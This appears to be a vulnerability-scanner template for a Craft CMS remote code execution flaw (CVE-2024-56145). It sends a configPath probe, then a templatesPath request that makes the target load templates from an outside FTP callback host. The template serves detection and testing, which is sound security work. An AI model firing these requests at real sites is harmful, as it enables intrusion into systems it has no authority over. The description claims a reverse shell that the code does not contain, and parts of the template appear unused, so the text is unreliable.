id: cve-2024-56145

info:
  name: Craft CMS Remote Code Execution (RCE)
  author: Ostorlab
  severity: critical
  description: |
    Craft CMS suffers from a Remote Code Execution (RCE) vulnerability due to improper handling of the `--configPath` parameter.
    This template checks if the target is vulnerable and exploits it by triggering a reverse shell.
  reference:
    - https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms
  tags: cve,cve2024,rce,craftcms

requests:
  - method: GET
    path:
      - "{{BaseURL}}?--configPath=/{{randstr}}"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 503

      - type: word
        words:
          - "mkdir()"
        part: body

    extractors:
      - type: regex
        part: body
        regex:
          - "mkdir\\(\\)"

  - method: GET
    path:
      - "{{BaseURL}}?--templatesPath=ftp://{{interactsh-url}}"

    payloads:
      default:
        - "{{interactsh-payload}}"

    attack: pitchfork
    threads: 10

    matchers:
      - type: regex
        regex:
          - "{{interactsh-placeholder}}"
        part: interactsh_protocol

    extractors:
      - type: regex
        part: interactsh_protocol
        regex:
          - "{{interactsh-placeholder}}"